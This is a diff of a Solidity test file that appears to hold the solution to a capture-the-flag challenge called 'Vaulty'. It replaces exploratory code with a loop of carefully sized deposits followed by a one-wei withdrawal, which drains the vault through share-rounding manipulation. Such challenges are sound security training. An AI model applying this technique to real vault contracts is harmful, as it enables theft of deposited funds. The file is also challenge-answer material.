@@ -9,7 +9,6 @@ import {IVaulty} from "src/romeroadrian-vaulty/interfaces/IVaulty.sol";
 // Import dependencies for your solution here! //
 //             (if you need any)               //
 ///////////////////////////////////////////////*/
-import {Exploiter} from "test/romeroadrian-vaulty/Exploiter.sol";
 
 contract VaultyTest is Test, VaultyDeployer {
     IVaulty public vaulty;
@@ -46,12 +45,14 @@ contract VaultyTest is Test, VaultyDeployer {
         /*//////////////////////////////////////
         //     Write your solution here       //
         //////////////////////////////////////*/
-        vaulty.deposit{value: 15 ether}();
-        console2.log("total assets: ", vaulty.totalAssets());
-        console2.log("total supply: ", vaulty.totalSupply());
-        vaulty.withdraw(0);
-        console2.log("total assets: ", vaulty.totalAssets());
-        console2.log("total supply: ", vaulty.totalSupply());
+        vaulty.deposit{value: 2 * 10 ** 9 - 1}();
+        for (uint256 i = 1;; i++) {
+            uint256 depositAmount = 2 ** i * 10 ** 9 - 2 ** i;
+            if (address(player).balance < depositAmount) {
+                break;
+            }
+            vaulty.deposit{value: depositAmount}();
+        }
         /*//////////////////////////////////////
         //         Do not touch this          //
         //////////////////////////////////////*/
@@ -65,15 +66,7 @@ contract VaultyTest is Test, VaultyDeployer {
         /*//////////////////////////////////////
         //     Write your solution here       //
         //////////////////////////////////////*/
-        // Exploiter exploiter = new Exploiter(address(vaulty));
-        // address exploiter = vyperDeployer.deployContract("test/romeroadrian-vaulty/", "Exploiter");
-        console2.log("total assets: ", vaulty.totalAssets());
-        console2.log("total supply: ", vaulty.totalSupply());
-        vaulty.withdraw(15 * 10 ** 9);
-        console2.log("total assets: ", vaulty.totalAssets());
-        console2.log("total supply: ", vaulty.totalSupply());
-        vm.stopPrank();
-
+        vaulty.withdraw(1);
         assertTrue(vaulty.isSolved());
     }
 }
